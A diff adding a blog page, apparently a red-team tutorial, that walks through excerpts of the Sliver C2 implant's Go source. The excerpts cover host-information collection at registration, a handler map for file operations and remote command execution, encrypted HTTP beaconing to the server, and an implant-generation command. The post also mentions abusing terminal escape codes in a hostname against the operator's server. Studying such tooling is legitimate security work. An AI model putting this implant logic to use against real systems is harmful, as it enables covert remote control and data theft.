+<span class="line"><span style="color:#E6EDF3">				connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">&#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">					ID:   envelope.ID,</span></span>
+<span class="line"><span style="color:#E6EDF3">					Data: data,</span></span>
+<span class="line"><span style="color:#E6EDF3">				&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">			&#125;)</span></span>
+<span class="line"><span style="color:#8B949E">			// &#123;&#123;end&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> tunHandlers[envelope.Type]; ok &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope, connection)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> envelope.Type </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> sliverpb.MsgCloseSession &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			return</span><span style="color:#79C0FF"> nil</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#E6EDF3"> &#123; </span><span style="color:#8B949E">//empty message recieved, send back empty acknowledgement</span></span>
+<span class="line"><span style="color:#E6EDF3">			connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">&#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">				ID:                 envelope.ID,</span></span>
+<span class="line"><span style="color:#E6EDF3">				Data:               </span><span style="color:#79C0FF">nil</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">				UnknownMessageType: </span><span style="color:#79C0FF">true</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">			&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span>
+<span class="line"></span></code></pre><!----> <p>There are three interesting things going on here. First, we are registering a sliver. That function is below. What is interesting here, is that the registration is actually displayed upon connection to a sliver server. Modifying the hostname to use terminal escape codes actually can render the server useless (DoS clear screen) or potentially get an RCE such as <a href="https://www.gresearch.com/news/g-research-the-terminal-escapes/" rel="nofollow">https://www.gresearch.com/news/g-research-the-terminal-escapes/</a>. This is something to bear in mind, if a defender is willing to reverse engineer your beacons, they could make your life miserable.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> registerSliver</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Register</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">	hostname, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Hostname</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	currentUser, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> user.</span><span style="color:#D2A8FF">Current</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	filename, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Executable</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#8B949E">	// Retrieve UUID</span></span>
+<span class="line"><span style="color:#E6EDF3">	uuid </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> hostuuid.</span><span style="color:#D2A8FF">GetUUID</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Register</span><span style="color:#E6EDF3">&#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">		Name:              consts.SliverName,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Hostname:          hostname,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Uuid:              uuid,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Username:          currentUser.Username,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Uid:               currentUser.Uid,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Gid:               currentUser.Gid,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Os:                runtime.GOOS,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Version:           version.</span><span style="color:#D2A8FF">GetVersion</span><span style="color:#E6EDF3">(),</span></span>
+<span class="line"><span style="color:#E6EDF3">		Arch:              runtime.GOARCH,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Pid:               </span><span style="color:#FF7B72">int32</span><span style="color:#E6EDF3">(os.</span><span style="color:#D2A8FF">Getpid</span><span style="color:#E6EDF3">()),</span></span>
+<span class="line"><span style="color:#E6EDF3">		Filename:          filename,</span></span>
+<span class="line"><span style="color:#E6EDF3">		ReconnectInterval: </span><span style="color:#FF7B72">int64</span><span style="color:#E6EDF3">(transports.</span><span style="color:#D2A8FF">GetReconnectInterval</span><span style="color:#E6EDF3">()),</span></span>
+<span class="line"><span style="color:#E6EDF3">		ConfigID:          </span><span style="color:#A5D6FF">"&#123;&#123; .Config.ID &#125;&#125;"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">		PeerID:            pivots.MyPeerID,</span></span>
+<span class="line"><span style="color:#E6EDF3">		Locale:            locale.</span><span style="color:#D2A8FF">GetLocale</span><span style="color:#E6EDF3">(),</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>Second, the handler functions are quite interesting. These are the functions/objects that control what actually goes on. Take for instance the sysHandlers. (In certain cases) That is a generic handler like below.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/handlers/handlers_generic.go</span></span>
+<span class="line"><span style="color:#E6EDF3">genericHandlers </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> map</span><span style="color:#E6EDF3">[</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#FFA657">RPCHandler</span><span style="color:#E6EDF3">&#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgPing:           pingHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgLsReq:          dirListHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgDownloadReq:    downloadHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgUploadReq:      uploadHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgCdReq:          cdHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgPwdReq:         pwdHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgRmReq:          rmHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgMkdirReq:       mkdirHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgMvReq:          mvHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgCpReq:          cpHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgExecuteReq:     executeHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgSetEnvReq:      setEnvHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgEnvReq:         getEnvHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgUnsetEnvReq:    unsetEnvHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgReconfigureReq: reconfigureHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgChtimesReq:     chtimesHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgGrepReq:        grepHandler,</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E">	// Wasm Extensions - Note that execution can be done via a tunnel handler</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>As in the main loop, when we want to execute a command we would request the <code>sliverpb.MsgExecuteReq</code> which would let use access the underlying system through the following function. This function is taking a command protobuf object and executing it.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/handlers/handlers.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> executeHandler</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">data</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">resp</span><span style="color:#FFA657"> RPCResponse</span><span style="color:#E6EDF3">) &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">	var</span><span style="color:#E6EDF3"> (</span></span>
+<span class="line"><span style="color:#E6EDF3">		err       </span><span style="color:#FF7B72">error</span></span>
+<span class="line"><span style="color:#E6EDF3">		stdErr    </span><span style="color:#FFA657">io</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
+<span class="line"><span style="color:#E6EDF3">		stdOut    </span><span style="color:#FFA657">io</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
+<span class="line"><span style="color:#E6EDF3">		errWriter </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">bufio</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
+<span class="line"><span style="color:#E6EDF3">		outWriter </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">bufio</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
+<span class="line"><span style="color:#E6EDF3">	)</span></span>
+<span class="line"><span style="color:#E6EDF3">	execReq </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">ExecuteReq</span><span style="color:#E6EDF3">&#123;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Unmarshal</span><span style="color:#E6EDF3">(data, execReq)</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	execResp </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Execute</span><span style="color:#E6EDF3">&#123;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	exePath, err </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> expandPath</span><span style="color:#E6EDF3">(execReq.Path)</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	cmd </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> exec.</span><span style="color:#D2A8FF">Command</span><span style="color:#E6EDF3">(exePath, execReq.Args</span><span style="color:#FF7B72">...</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> execReq.Output &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">		stdOutBuff </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> new</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">bytes</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Buffer</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">		stdErrBuff </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> new</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">bytes</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Buffer</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">		stdErr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdErrBuff</span></span>
+<span class="line"><span style="color:#E6EDF3">		stdOut </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdOutBuff</span></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> execReq.Stderr </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">			stdErrFile, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Create</span><span style="color:#E6EDF3">(execReq.Stderr)</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			defer</span><span style="color:#E6EDF3"> stdErrFile.</span><span style="color:#D2A8FF">Close</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">			errWriter </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> bufio.</span><span style="color:#D2A8FF">NewWriter</span><span style="color:#E6EDF3">(stdErrFile)</span></span>
+<span class="line"><span style="color:#E6EDF3">			stdErr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> io.</span><span style="color:#D2A8FF">MultiWriter</span><span style="color:#E6EDF3">(errWriter, stdErrBuff)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> execReq.Stdout </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">			stdOutFile, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Create</span><span style="color:#E6EDF3">(execReq.Stdout)</span></span>
+<span class="line"><span style="color:#FF7B72">			...</span></span>
+<span class="line"><span style="color:#FF7B72">			defer</span><span style="color:#E6EDF3"> stdOutFile.</span><span style="color:#D2A8FF">Close</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">			outWriter </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> bufio.</span><span style="color:#D2A8FF">NewWriter</span><span style="color:#E6EDF3">(stdOutFile)</span></span>
+<span class="line"><span style="color:#E6EDF3">			stdOut </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> io.</span><span style="color:#D2A8FF">MultiWriter</span><span style="color:#E6EDF3">(outWriter, stdOutBuff)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		cmd.Stdout </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdOut</span></span>
+<span class="line"><span style="color:#E6EDF3">		cmd.Stderr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdErr</span></span>
+<span class="line"><span style="color:#E6EDF3">		err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> cmd.</span><span style="color:#D2A8FF">Run</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">		...</span></span>
+<span class="line"><span style="color:#E6EDF3">		execResp.Stderr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdErrBuff.</span><span style="color:#D2A8FF">Bytes</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">		execResp.Stdout </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdOutBuff.</span><span style="color:#D2A8FF">Bytes</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> cmd.Process </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">			execResp.Pid </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> uint32</span><span style="color:#E6EDF3">(cmd.Process.Pid)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125; </span><span style="color:#FF7B72">else</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">		err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cmd.</span><span style="color:#D2A8FF">Start</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">		...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">		go</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">			cmd.</span><span style="color:#D2A8FF">Wait</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> cmd.Process </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">			execResp.Pid </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> uint32</span><span style="color:#E6EDF3">(cmd.Process.Pid)</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	data, err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Marshal</span><span style="color:#E6EDF3">(execResp)</span></span>
+<span class="line"><span style="color:#D2A8FF">	resp</span><span style="color:#E6EDF3">(data, err)</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <p>Third, we have to remember that the send function is actually a channel that is created when we initialize a session. So in httpConnect() we are spinning up a go subroutine which is handling all information that is sent.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/transports/session.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> httpConnect</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">uri</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">url</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">URL</span><span style="color:#E6EDF3">) (</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3">) &#123;</span></span>
+<span class="line"><span style="color:#E6EDF3">	send </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> make</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">chan</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">	recv </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> make</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">chan</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	connection.Start </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">		...</span></span>
+<span class="line"><span style="color:#FF7B72">		go</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">			defer</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">Cleanup</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FF7B72">			for</span><span style="color:#E6EDF3"> envelope </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> send &#123;</span></span>
+<span class="line"><span style="color:#8B949E">				// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">				log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"[http] send envelope ..."</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#8B949E">				// &#123;&#123;end&#125;&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">				go</span><span style="color:#E6EDF3"> client.</span><span style="color:#D2A8FF">WriteEnvelope</span><span style="color:#E6EDF3">(envelope)</span></span>
+<span class="line"><span style="color:#E6EDF3">			&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">		&#125;()</span></span>
+<span class="line"><span style="color:#FF7B72">		...</span></span></code></pre><!----> <p>WriteEnvelope (ReadEnvelope is a polling feature GetRequest (which all our data comes from)) looks like the following and is encoding the message and shipping it to the server.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/transports/httpclient/httpclient.go</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E">// WriteEnvelope - Perform an HTTP POST request</span></span>
+<span class="line"><span style="color:#FF7B72">func</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">s </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">) </span><span style="color:#D2A8FF">WriteEnvelope</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">envelope</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> s.Closed &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> ErrClosed</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	data, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Marshal</span><span style="color:#E6EDF3">(envelope)</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> s.SessionID </span><span style="color:#FF7B72">==</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> errors.</span><span style="color:#D2A8FF">New</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"no session"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#E6EDF3">	reqData, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.SessionCtx.</span><span style="color:#D2A8FF">Encrypt</span><span style="color:#E6EDF3">(data)</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	uri </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">parseSegments</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">	nonce, encoder </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoders.</span><span style="color:#D2A8FF">RandomEncoder</span><span style="color:#E6EDF3">(</span><span style="color:#D2A8FF">len</span><span style="color:#E6EDF3">(reqData))</span></span>
+<span class="line"><span style="color:#E6EDF3">	s.</span><span style="color:#D2A8FF">NonceQueryArgument</span><span style="color:#E6EDF3">(uri, nonce)</span></span>
+<span class="line"><span style="color:#E6EDF3">	encodedValue, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoder.</span><span style="color:#D2A8FF">Encode</span><span style="color:#E6EDF3">(reqData)</span></span>
+<span class="line"><span style="color:#E6EDF3">	reader </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> bytes.</span><span style="color:#D2A8FF">NewReader</span><span style="color:#E6EDF3">(encodedValue)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">	req </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">newHTTPRequest</span><span style="color:#E6EDF3">(http.MethodPost, uri, reader)</span></span>
+<span class="line"><span style="color:#E6EDF3">	resp, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.driver.</span><span style="color:#D2A8FF">Do</span><span style="color:#E6EDF3">(req)</span></span>
+<span class="line"><span style="color:#FF7B72">	...</span></span>
+<span class="line"><span style="color:#E6EDF3">	</span></span>
+<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> resp.StatusCode </span><span style="color:#FF7B72">!=</span><span style="color:#E6EDF3"> http.StatusAccepted &#123;</span></span>
+<span class="line"><span style="color:#FF7B72">		...</span></span>
+<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> ErrStatusCodeUnexpected</span></span>
+<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
+<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
+<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre><!----> <h3>Implant Generation</h3> <p>Implant Generation is relatively simple. I use the following command to generate implants on my server instance. Please see my other post (or the sliver docs) about setting up a server.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FFA657">sliver</span><span style="color:#E6EDF3">> </span><span style="color:#A5D6FF">generate</span><span style="color:#79C0FF"> --http</span><span style="color:#79C0FF"> 127.0.0.1</span><span style="color:#79C0FF"> --save</span><span style="color:#A5D6FF"> /home/vboxuser/Downloads</span><span style="color:#79C0FF"> --debug</span><span style="color:#79C0FF"> --os</span><span style="color:#A5D6FF"> linux</span></span></code></pre><!----><!----></div></div><!----><!----> <br> <div><hr></div><!----><!----><!--]--> <!--[!--><!--]--><!--]-->
+			
+			<script>
+				{
+					__sveltekit_1sefmzd = {
+						base: new URL("..", location).pathname.slice(0, -1)
+					};
+
+					const element = document.currentScript.parentElement;
+
+					Promise.all([
+						import("../_app/immutable/entry/start.ouMra9AW.js"),
+						import("../_app/immutable/entry/app.CO75G284.js")
+					]).then(([kit, app]) => {
+						kit.start(app, element, {
+							node_ids: [0, 4],
+							data: [null,null],
+							form: null,
+							error: null
+						});
+					});
+				}
+			</script>
+		</div>
+	</body>
+	
+</html>
